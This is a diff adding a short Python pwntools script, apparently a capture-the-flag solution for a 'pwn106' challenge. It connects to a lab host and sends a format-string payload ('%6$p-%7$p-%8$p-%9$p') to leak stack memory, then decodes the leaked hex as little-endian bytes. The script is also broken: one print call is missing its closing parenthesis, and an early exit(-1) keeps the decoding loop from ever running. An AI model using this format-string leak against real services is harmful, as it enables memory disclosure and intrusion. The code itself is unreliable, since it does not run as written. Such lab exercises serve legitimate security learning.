@@ -1,0 +1,19 @@
+
+from pwn import *
+
+context.log_level = "debug"
+
+
+p = process('./pwn106-user-1644300441063.pwn106-user')
+p = remote('10.10.141.199', 9006)
+p.sendline(b'%6$p-%7$p-%8$p-%9$p')
+recv = p.recv()
+recv = str(recv).split(' ')#.strip("\\n'").split('-')
+print(str(recv).split(' ')
+exit(-1)
+x = lambda y : bytes.fromhex(y)[::-1]
+data = ''
+for i in recv:
+    data += str(x(i[2:]))
+print(data)
+p.interactive()
